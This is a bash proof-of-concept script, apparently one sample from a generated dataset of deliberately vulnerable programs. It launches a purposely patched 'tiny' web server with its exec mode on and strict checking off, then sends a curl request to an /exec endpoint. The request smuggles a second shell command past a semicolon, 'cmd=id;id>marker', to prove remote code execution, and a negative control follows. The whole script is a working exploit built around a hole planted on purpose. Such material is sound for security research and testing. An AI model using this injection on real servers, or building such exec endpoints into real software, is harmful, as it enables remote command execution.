#!/usr/bin/env bash
# PoC for 018_tiny-web-server_C2I3S3
# Axes: C2 (struct config gate, two flags) / I3 (struct dispatch) / S3 (strict but bypass: omit --strict-exec)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (tiny) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/tiny"
WWWROOT="/tmp/poc_018_www"
MARKER="/tmp/poc_018_marker"
PORT=18018

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server (without --strict-exec to bypass S3) ─────────────────────────
echo "[*] starting tiny with --exec-mode --exec-logging (no --strict-exec) on port $PORT..."
"$BINARY" --exec-mode --exec-logging "$WWWROOT" $PORT &
SERVER_PID=$!
sleep 0.4

# ── trigger (semicolon works since strict_exec is not set) ───────────────────
echo "[*] sending payload: cmd=id;id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id;id>${MARKER}" > /dev/null || true

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without flags ────────────────────────────
echo "[*] verifying gate: endpoint must be absent without --exec-mode --exec-logging..."
"$BINARY" "$WWWROOT" 19018 &
SAFE_PID=$!
sleep 0.4
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:19018/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without flags"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
